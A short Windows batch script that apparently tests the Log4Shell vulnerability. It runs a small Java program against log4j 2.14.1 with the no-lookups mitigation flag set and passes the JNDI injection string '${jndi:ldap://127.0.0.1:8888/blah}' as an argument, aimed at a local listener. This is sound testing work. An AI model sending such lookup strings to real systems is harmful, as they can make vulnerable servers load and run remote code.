set CLASSPATH=log4j-api-2.14.1.jar;log4j-core-2.14.1.jar
set LOG4J_FORMAT_MSG_NO_LOOKUPS=true
javac Gday.java
java -cp log4j-api-2.14.1.jar;log4j-core-2.14.1.jar;../ gday.Gday ${jndi:ldap://127.0.0.1:8888/blah}